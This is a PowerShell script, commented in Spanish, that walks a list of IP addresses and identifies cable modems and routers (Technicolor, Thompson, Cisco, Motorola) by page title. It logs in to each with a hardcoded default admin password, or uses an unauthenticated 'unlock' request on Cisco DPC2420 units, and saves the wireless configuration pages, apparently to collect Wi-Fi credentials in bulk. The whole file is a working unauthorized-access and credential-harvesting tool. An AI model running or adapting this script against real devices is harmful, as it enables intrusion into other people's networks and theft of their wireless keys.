$ACTUAL_PATH = Get-Location;
$SAVE_FOLDER = "$ACTUAL_PATH\save";
$IPs_LIST_PATH = "$ACTUAL_PATH\NATIp.txt";

function isDownOK(){
    return (([System.IO.File]::Exists($save) -and ((Get-Item $save).length) -gt 500))
}

function verifyFile(){
	Try{
		if(isDownOK $ip){
            (Get-Content $save) -replace '\-', ':' | Set-Content $save;
		}else{
			echo "No se pudo obtener información. Verificar credenciales";
		}
	}
	Catch{
		echo "FAIL";
	}
}

function createDirectory($DirectoryToCreate){
	if (!(Test-Path -LiteralPath $DirectoryToCreate)) {
		try {
			New-Item -Path $DirectoryToCreate -ItemType Directory -ErrorAction Stop | Out-Null
		}
		catch {
			Write-Error -Message "No se puede crear el directorio '$DirectoryToCreate'. Error: $_" -ErrorAction Stop
		}
		"Directorio creado '$DirectoryToCreate'."
	}
}

function setup(){
	#Verificar si existe la lista de IPs
	if(!(Test-Path $IPs_LIST_PATH)){
		echo "No se encuentra la lista de IPs"
		break;
	}

	#Crear directorio donde se guardará los resultados del escaner
	createDirectory $SAVE_FOLDER
}

#===================Routers=====================
#Technicolor y Thompson que usan DOCSIS 2.0 
function techTom($ip){
	echo "$ip - Technicolor - Thompson" 
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl -o $save --connect-timeout 3 -m 60 -s -u admin:Uq-4GIt3M -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/wlanRadio.asp" -H "Cookie: name=Session" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
	verifyFile;
}

#Cisco DPC3925
function cisco($ip){
	echo "$ip - Cisco DPC3925" 
	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
    wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "username_login=admin&password_login=Uq-4GIt3M&LanguageSelect=en&Language_Submit=0&login=Log+In" -T 3 http://$ip/goform/Docsis_system | out-null;
	if(Test-Path $cookie){
		wget -qO- -q --load-cookies $cookie -O $save --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/WNetwork.asp | out-null;
		verifyFile
		Remove-Item $cookie;
	}else{
		echo "No se pudo obtener acceso a $ip. Verificar credenciales"
	}
}

#Tech WAN
function wan($ip){
echo "$ip - Wan" 
    curl --connect-timeout 3 -s -m 10 -H 'Host: $ip' -H 'Cache-Control: max-age=0' -H 'Origin: http://$ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --data "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/home_loggedout | out-null;
	curl -o $save --connect-timeout 3 -m 60 -s -H 'Host: $ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/software.asp' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --compressed http://$ip/wireless_network_configuration.asp;
   	verifyFile
}

#Motorola con DOCSIS 2.0
function motorola($ip){ 
echo "$ip - Motorola DOCSIS 2.0" 
    curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
    curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp | out-null;
    curl --connect-timeout 3 -m 60 -s -o $save -u admin:Uq-4GIt3M -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "Authorization: Basic YWRtaW46VXEtNEdJdDNN" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36" -H "Connection: keep-alive" --compressed http://$ip/wlanPrimaryNetwork.asp;
    verifyFile
}

#Motorola SBG900
function motorolasbg($ip){ 
echo "$ip - Motorola SBG900" 
    if((Invoke-WebRequest -Uri "http://$ip/frames.asp" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/index.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "userId=admin&password=Uq-4GIt3M&btnLogin=Log+In").content -match '\d\d\d\d\d')
    {
    $sessionID = $Matches[0]
    curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
    verifyFile
    }
}

#Desbloquear caracteristicas de wireless de los Cisco DPC2420
function unlockCisco($ip){
	curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv1=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff2=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv2=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv=1" "http://$ip/goform/techsupport.asp" | out-null;
    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv16=1" "http://$ip/goform/techsupport.asp" | out-null;
}


#Cisco DPC2420
function ciscoAuth($ip){
echo "$ip - Cisco DPC2420" 
	unlockCisco $ip;
	unlockCisco $ip;
	curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp  | out-null;
    curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp;
    verifyFile
}

#Technicolor CGA0101
function techCGA0101($ip){
echo "$ip - Technicolor Nuevos" 
        curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
		curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
		verifyFile
}

function runScanner(){
	setup
	foreach($line in Get-Content .\NATIp.txt) {
		$title = curl --connect-timeout 3 -m 10 -s -L $line | findstr -i title
		if(![string]::IsNullOrEmpty($title)){
			$save = "$SAVE_FOLDER\$line.txt"
			switch -regex ($title){
				".*HTTP 401 - Unauthorized.*" {techTom $line; break}
				".*<title>Setup</title>.*" {cisco $line; break}
				".*<title>WAN</title>.*" {wan $line; break}
				".*<title>Residential Gateway Login</title>.*" {motorola $line; break}
				".*<title>Motorola SBG900</title>.*"  {motorolasbg $line; break}
				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoAuth $line; break}
				".*<title>Cisco Cable Modem</title>.*"  {ciscoAuth $line; break}
				".*<title>Common UI</title>.*" {techCGA0101 $line; break}

				default {$title; Break}
			}
		}
	}
}

runScanner

Read-Host -Prompt "Press Enter to exit"